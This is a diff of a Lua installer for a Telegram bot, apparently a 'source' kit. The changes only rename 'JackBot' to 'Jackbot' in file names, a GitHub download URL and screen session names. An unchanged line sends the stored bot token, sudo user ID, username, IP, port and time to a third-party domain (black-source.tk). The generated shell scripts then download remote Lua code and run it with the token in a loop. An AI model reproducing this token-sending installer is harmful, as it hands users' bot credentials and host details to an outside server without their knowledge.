@@ -67,28 +67,28 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=DV&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-print("::JackBot::")
-local RunBot = io.open("JackBot", 'w')
+print("::Jackbot::")
+local RunBot = io.open("Jackbot", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/JackBot
+cd $HOME/Jackbot
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr BLACKBOTSS.lua
-wget "https://raw.githubusercontent.com/JackBot2/JackBot/master/JackBot.lua"
+wget "https://raw.githubusercontent.com/Jackbot2/Jackbot/master/Jackbot.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./JackBot.lua -p PROFILE --bot=$token
+./tg -s ./Jackbot.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/JackBot
+cd $HOME/Jackbot
 while(true) do
 rm -fr ../.telegram-cli
-screen -S JackBot -X kill
-screen -S JackBot ./JackBot
+screen -S Jackbot -X kill
+screen -S Jackbot ./Jackbot
 done
 ]])
 RunTs:close()
